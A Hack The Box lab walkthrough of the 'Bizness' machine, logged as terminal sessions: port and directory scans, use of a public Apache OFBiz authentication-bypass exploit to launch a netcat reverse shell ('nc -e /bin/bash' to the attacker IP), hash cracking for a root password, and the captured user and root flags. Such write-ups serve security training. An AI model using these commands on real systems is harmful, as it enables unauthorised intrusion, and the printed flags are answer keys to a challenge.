https://app.hackthebox.com/machines/Bizness

Service Enumeration

┌──(root㉿kali)-\[/home/kali/HTB/Bizness\]

└─# nmap -p- --min-rate 10000 10.10.11.252

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 07:42 JST

Warning: 10.10.11.252 giving up on port because retransmission cap hit (10).

Nmap scan report for 10.10.11.252

Host is up (0.22s latency).

Not shown: 65270 closed tcp ports (reset), 261 filtered tcp ports (no-response)

PORT      STATE SERVICE

22/tcp    open  ssh

80/tcp    open  http

443/tcp   open  https

40767/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 36.69 seconds

![[Bizness image.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Bizness\]

└─# nmap -sC -sV -A -p443 --min-rate 10000 10.10.11.252

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 10:12 JST

Nmap scan report for 10.10.11.252

Host is up (0.20s latency).

PORT    STATE SERVICE  VERSION

443/tcp open  ssl/http nginx 1.18.0

\|_http-server-header: nginx/1.18.0

\|_http-title: 400 The plain HTTP request was sent to HTTPS port

\| tls-nextprotoneg:

\|_  http/1.1

\|_ssl-date: TLS randomness does not represent time

\| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK

\| Not valid before: 2023-12-14T20:03:40

\|_Not valid after:  2328-11-10T20:03:40

\| tls-alpn:

\|_  http/1.1

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)

HOP RTT       ADDRESS

1   201.36 ms 10.10.14.1

2   201.36 ms 10.10.11.252

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 57.15 seconds

![[Bizness image 1.png]]

Directry Enumeration

┌──(root㉿kali)-\[/home/kali/HTB/Bizness\]

└─# dirsearch -u https://bizness.htb

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html

from pkg_resources import DistributionNotFound, VersionConflict

_|. _ _  _  _  _ _|_    v0.4.3

(_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET

Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/Bizness/reports/https_bizness.htb/_24-04-14_14-28-41.txt

Target: https://bizness.htb/

\[14:28:41\] Starting:

\[14:29:08\] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd

\[14:29:11\] 400 -  795B  - /a%5c.aspx

\[14:29:13\] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/

\[14:29:50\] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/

\[14:29:54\] 404 -  780B  - /common/config/api.ini

\[14:29:54\] 404 -  779B  - /common/config/db.ini

\[14:29:54\] 404 -  762B  - /common/

\[14:29:54\] 302 -    0B  - /common  ->  https://bizness.htb/common/

\[14:29:58\] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main

\[14:29:58\] 302 -    0B  - /content  ->  https://bizness.htb/content/

\[14:29:58\] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main

\[14:29:58\] 200 -   34KB - /control/

\[14:29:58\] 200 -   34KB - /control

\[14:30:00\] 200 -   11KB - /control/login

\[14:30:03\] 404 -  741B  - /default.jsp

\[14:30:03\] 404 -  763B  - /default.html

\[14:30:08\] 302 -    0B  - /error  ->  https://bizness.htb/error/

\[14:30:08\] 404 -  761B  - /error/

\[14:30:08\] 404 -  770B  - /error/error.log

\[14:30:09\] 302 -    0B  - /example  ->  https://bizness.htb/example/

\[14:30:19\] 302 -    0B  - /images  ->  https://bizness.htb/images/

\[14:30:19\] 404 -  769B  - /images/c99.php

\[14:30:19\] 404 -  762B  - /images/

\[14:30:19\] 404 -  768B  - /images/README

\[14:30:19\] 404 -  769B  - /images/Sym.php

\[14:30:20\] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main

![[Bizness image 2.png]]

![[Bizness image 3.png]]

![[Bizness image 4.png]]

**Initial Access**

┌──(root㉿kali)-\[/home/kali/github\]

└─# git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git

Cloning into 'Apache-OFBiz-Authentication-Bypass'...

remote: Enumerating objects: 19, done.

remote: Counting objects: 100% (14/14), done.

remote: Compressing objects: 100% (12/12), done.

remote: Total 19 (delta 3), reused 7 (delta 1), pack-reused 5

Receiving objects: 100% (19/19), 51.44 MiB | 9.19 MiB/s, done.

Resolving deltas: 100% (3/3), done.

![[Bizness image 5.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Bizness\]

└─# nc -nlvp 4444

listening on \[any\] 4444 ...

![[Bizness image 6.png]]

──(root㉿kali)-\[/home/kali/HTB/Bizness\]

└─# python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.14.120 4444'

\[+\] Generating payload...

\[+\] Payload generated successfully.

\[+\] Sending malicious serialized payload...

\[+\] The request has been successfully sent. Check the result of the command.

![[Bizness image 7.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Bizness\]

└─# nc -nlvp 4444

listening on \[any\] 4444 ...

connect to \[10.10.14.120\] from (UNKNOWN) \[10.10.11.252\] 35706

![[Bizness image 8.png]]

id

uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)

cd /home/ofbiz

ls

user.txt

cat user.txt

7f5a0a5cfd4dcc51073a0daa4aa7f4c7

Privilege Escalation

┌──(root㉿kali)-\[/home/kali/HTB/Bizness\]

└─# python3 bizness.py

Processing:  10%|██████████                                                                                        | 1471325/14344392 \[00:04\<00:38, 336755.46it/s\]Found Password:monkeybizness, hash:$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=

Processing:  10%|██████████

![[Bizness image 9.png]]

su

monkeybizness

id

uid=0(root) gid=0(root) groups=0(root)

ls /root

root.txt

cat /root/root.txt

591564d1d8d3b2b3c1a91836efd02533

![[Bizness image 10.png]]